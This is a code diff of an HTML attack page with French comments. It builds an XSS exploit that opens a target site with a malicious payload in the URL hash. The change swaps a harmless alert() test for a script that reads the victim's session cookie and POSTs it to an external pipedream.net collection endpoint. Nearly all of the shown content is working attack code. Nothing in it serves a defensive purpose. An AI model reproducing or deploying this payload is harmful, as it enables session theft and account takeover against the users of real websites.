@@ -12,37 +12,25 @@
     const requestBinURL = "https://eo2uyqmp09oup0u.m.pipedream.net";
 
     // Définir le payload XSS
-    const xssPayload = "<img src='x' onerror='alert(\"XSS workos!\")'>";
-    
+    const xssPayload = "<script>" +
+      "const sessionCookie = document.cookie;" + // Récupérer le cookie de session
+      "fetch('" + requestBinURL + "', {" + // Envoyer le cookie au RequestBin
+      "method: 'POST'," +
+      "headers: {'Content-Type': 'application/json'}," +
+      "body: JSON.stringify({ cookie: sessionCookie })" +
+      "}).then(response => response.json())" +
+      ".then(data => console.log('Cookie envoyé :', data))" +
+      ".catch(error => console.error('Erreur lors de l\'envoi du cookie:', error));" +
+      "</script>";
+
     // Ajouter le payload dans le hash de l'URL
     const maliciousHash = "#<div id='output'>" + xssPayload + "</div>";
 
     // Ouvrir la page cible avec le payload malveillant dans l'URL
     const newWindow = window.open(targetURL + maliciousHash);
-
-    // Attendre que la fenêtre cible soit complètement chargée
-    newWindow.onload = function() {
-      // Récupérer le cookie de session
-      const sessionCookie = document.cookie;
-
-      // Vérifier si un cookie de session est présent
-      if (sessionCookie) {
-        // Envoyer le cookie de session à votre serveur via fetch
-        fetch(requestBinURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ cookie: sessionCookie })
-        })
-        .then(response => response.json())
-        .then(data => console.log('Cookie envoyé :', data))
-        .catch(error => console.error('Erreur lors de l\'envoi du cookie:', error));
-      }
-    };
-
+    
   </script>
   
-  <p>Chargement...</p>
+  <p>Chargementos...</p>
 </body>
 </html>
